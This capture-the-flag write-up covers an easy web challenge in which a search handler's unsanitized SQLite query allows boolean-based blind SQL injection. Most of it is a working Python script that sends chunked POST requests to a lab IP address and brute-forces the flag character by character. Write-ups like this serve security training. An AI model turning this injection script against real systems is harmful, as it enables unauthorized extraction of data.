# Info
Difficulty: Easy
# Desc
>Are you able to retrieve the 6th character from the database?

# Writeup
This is a classic CRUD website, according to the provided source code, there are two methods that the server uses to query data in sqlite.
One is safe, but another is not. The unsafe query didn't sanitize input at all, so we can exploit to retrieve sensitive data.
The problem is the sqli is boolean-based, and it required the request to be sent in chunked encoding.

After spending some time testing, I have finally finished a script that sends chunked data and is able to bruteforce the flag.
```python
from requests import Request, Session
import urllib.parse, string
table = string.printable

url = "http://83.136.252.214:45440/Controllers/Handlers/SearchHandler.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
flag = ""

while "}" not in flag:
    next_index = len(flag)+1
    for index, char in enumerate(table):
        def gen():
            yield ("search=" + urllib.parse.quote(f"6' and substr(gamedesc,{next_index},1) = '{char}")).encode('utf-8')

        s = Session()
        r = Request('POST', url=url, headers=headers, data=gen())
        req = r.prepare()    
        res = s.send(req)
        if "No post id found" in res.text:
            flag += char
            print(flag)
            break
```